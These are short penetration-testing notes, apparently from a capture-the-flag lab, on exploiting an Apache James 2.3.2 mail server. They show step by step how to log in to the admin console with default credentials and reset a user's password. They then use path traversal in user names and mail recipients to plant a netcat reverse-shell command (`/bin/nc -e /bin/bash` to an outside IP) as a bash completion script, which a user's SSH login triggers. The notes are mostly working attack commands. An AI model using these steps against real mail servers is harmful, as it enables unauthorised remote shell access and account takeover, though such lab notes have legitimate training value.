hMailServer (appear on port 587 SMTP on nmap scan)
Apache James (4555 rsip or james-admin, 119 nntp)

```
nc -vn 10.129.34.217 25
```
- get some info about SMTP server running

James 2.3.2
```
nc 10.129.34.217 4555
```
- will request login, try root:root default creds
- `HELP` to see commands. important ones:
	- `listusers` show users
	- `setpassword mindy password123` change pw for mindy
	- `adduser name password` create user
		- `adduser ../../../../../../../../etc/bash_completion.d 0xdf0xdf`
			- creates user with folder in root directory to access emails (when any user logs in, triggers bash completion script)
```
telnet 10.129.226.162 110
```
- connect to POP3 server
- Interesting commands:
	- `USER mindy` sets username to mindy
	- `PASS password` set pw to password
	- `LIST` list emails
	- `RETR 1` read first email (`RETR 2` to read 2nd etc)
```
telnet 10.129.226.162 25
```
- connect to SMTP server. Commands:
	- `EHLO dank` introduce client (myself aka dank) to server
		- 250 response code = success
	- `MAIL FROM: <'dank@10.10.14.47>` set sender's email address
	- `RCPT TO: <../../../../../../../../etc/bash_completion.d>` specifies recipient of email
		- write to content to file on server
	- `DATA` signals content of email will follow
		- 354 code indicates server is ready to recieve email data
	- `FROM: 0xdf@10.10.14.47` first line of email content 
	- `'` injection to break current context (rest will be created as the file in bash_completion.d file)
	- `/bin/nc -e /bin/bash 10.10.14.133 443` shell saved as completion script
	- `.` end of email
		- 250 code = message recieved and accepted
	- `quit`
- start listener `nc -lvnp 443` and login with ssh to trigger script for shell `ssh mindy@10.129.226.162`

`